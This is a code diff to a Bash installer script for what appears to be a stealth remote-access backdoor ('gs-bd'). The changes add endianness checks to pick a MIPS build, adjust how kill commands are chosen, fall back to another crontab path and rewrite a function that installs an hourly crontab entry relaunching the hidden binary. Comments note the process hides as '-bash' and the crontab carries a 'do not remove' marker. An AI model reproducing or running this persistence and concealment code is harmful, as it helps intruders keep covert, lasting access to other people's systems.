@@ -502,6 +502,22 @@ try_encode()
 	DECODE_STR="$dec"
 }
 
+
+# Return TRUE if we are 100% sure it's little endian
+is_le()
+{
+	command -v lscpu >/dev/null && {
+		[[ $(lscpu) == *"Little Endian"* ]] && return 0
+		return 255
+	}
+
+	command -v od >/dev/null && command -v awk >/dev/null && {
+		[[ $(echo -n I | od -o | awk 'FNR==1{ print substr($2,6,1)}') == "1" ]] && return 0
+	}
+
+	return 255
+}
+
 init_vars()
 {
 	# Select binary
@@ -530,8 +546,11 @@ init_vars()
 				OSARCH="aarch64-linux"
 			elif [[ "$arch" == "mips64" ]]; then
 				OSARCH="mips64-alpine"
+				# Go 32-bit if Little Endian even if 64bit arch
+				is_le && OSARCH="mipsel32-alpine"
 			elif [[ "$arch" == *mips* ]]; then
 				OSARCH="mips32-alpine"
+				is_le && OSARCH="mipsel32-alpine"
 			fi
 		elif [[ $OSTYPE == *darwin* ]]; then
 			if [[ "$arch" == "arm64" ]]; then
@@ -565,6 +584,8 @@ init_vars()
 	# Because we hide as '-bash' we can not use pkill all -bash.
 	# 'killall' however matches gs-dbus and on OSX we thus force killall
 	if [[ $OSTYPE == *darwin* ]]; then
+		# on OSX 'pkill' matches the process (argv[0]) whereas on Unix
+		# 'pkill' matches the binary name.
 		KL_CMD="killall"
 		KL_CMD_RUNCHK_UARG=("-0" "-u${USER}")
 	elif command -v pkill >/dev/null; then
@@ -582,6 +603,7 @@ init_vars()
 	[[ -z $KL_CMD_BIN ]] && {
 		# set to something that returns 'false' so that we dont
 		# have to check for empty string in crontab/.profile
+		# (e.g. skip checking if already running and always start)
 		KL_CMD_BIN="$(command -v false)"
 		[[ -z $KL_CMD_BIN ]] && KL_CMD_BIN="/bin/does-not-exit"
 		WARN "No pkill or killall found."
@@ -624,6 +646,8 @@ init_vars()
 	RCLOCAL_SEC_FILE="${RCLOCAL_DIR}/${SEC_NAME}"
 
 	CRONTAB_DIR="${GS_PREFIX}/var/spool/cron/crontabs"
+	[[ ! -d "${CRONTAB_DIR}" ]] && CRONTAB_DIR="${GS_PREFIX}/etc/cron/crontabs"
+
 	local pids
 	pids="$(pgrep "${BIN_HIDDEN_NAME}" 2>/dev/null)"
 	# OSX's pgrep works on argv[0] proc-name
@@ -1017,11 +1041,15 @@ install_user_crontab()
 	[[ $UID -eq 0 ]] && {
 		mk_file "${CRONTAB_DIR}/root"
 	}
-	local cr_time
-	cr_time="0 * * * *"
-	(crontab -l 2>/dev/null && \
-	echo "$NOTE_DONOTREMOVE" && \
-	echo "${cr_time} $CRONTAB_LINE") | grep -F -v -- gs-bd | crontab - 2>/dev/null || { FAIL_OUT; return; }
+
+	local old
+	old="$(crontab -l 2>/dev/null)" || {
+		# Create empty crontab (busybox) if no crontab exists at all.
+		crontab - </dev/null &>/dev/null
+	}
+	[[ -n $old ]] && old+=$'\n'
+
+	echo -e "${old}${NOTE_DONOTREMOVE}\n0 * * * * $CRONTAB_LINE" | grep -F -v -- gs-bd | crontab - 2>/dev/null || { FAIL_OUT; return; }
 
 	((IS_INSTALLED+=1))
 	OK_OUT
@@ -1328,7 +1356,7 @@ try()
 # binaries and fail hard if none could be found.
 try_any()
 {
-	targets="x86_64-alpine i386-alpine aarch64-linux armv6l-linux x86_64-cygwin x86_64-freebsd x86_64-osx"
+	targets="x86_64-alpine i386-alpine aarch64-linux arm-linux x86_64-cygwin x86_64-freebsd x86_64-osx"
 	for osarch in $targets; do
 		[[ "$osarch" = "$OSARCH" ]] && continue # Skip the default OSARCH (already tried)
 		try "$osarch"
